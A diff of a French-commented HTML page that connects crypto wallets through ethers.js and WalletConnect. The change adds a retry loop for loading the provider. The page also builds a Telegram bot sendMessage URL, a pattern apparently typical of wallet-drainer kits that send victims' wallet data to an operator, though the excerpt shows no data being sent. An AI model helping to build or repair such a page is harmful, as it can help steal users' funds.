@@ -10,8 +10,8 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <!-- Librairies externes -->
     <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" type="text/javascript"></script>
-    <!-- Charger WalletConnect 2.x (corriger le chemin) -->
-    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.10.0/dist/index.umd.js"></script>
+    <!-- Charger WalletConnect 2.x -->
+    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.10.0/dist/index.umd.js" defer></script>
     <style>
         /* Styles pour le popup et l'overlay */
         .wallet-popup {
@@ -222,6 +222,20 @@
         // URL Telegram
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
 
+        // Fonction pour attendre que window.EthereumProvider soit défini
+        async function waitForEthereumProvider(maxAttempts = 10, interval = 500) {
+            let attempts = 0;
+            while (!window.EthereumProvider && attempts < maxAttempts) {
+                console.log(`Tentative de chargement de EthereumProvider, tentative #${attempts}`);
+                await delay(interval);
+                attempts++;
+            }
+            if (!window.EthereumProvider) {
+                throw new Error('EthereumProvider n’est pas chargé après plusieurs tentatives.');
+            }
+            console.log('EthereumProvider chargé avec succès :', window.EthereumProvider);
+        }
+
         // Initialisation au chargement de la page
         document.addEventListener('DOMContentLoaded', async () => {
             try {
@@ -256,9 +270,11 @@
                     return;
                 }
 
-                // Vérifier que WalletConnect EthereumProvider est chargé
-                if (!window.EthereumProvider) {
-                    console.error('Erreur : WalletConnect EthereumProvider (WalletConnect 2.x) n’est pas chargé.');
+                // Attendre que WalletConnect EthereumProvider soit chargé
+                try {
+                    await waitForEthereumProvider();
+                } catch (error) {
+                    console.error('Erreur : WalletConnect EthereumProvider (WalletConnect 2.x) n’est pas chargé.', error);
                     updateStatus(elements, 'Erreur : Problème de chargement de WalletConnect.', false, 'red');
                     return;
                 }
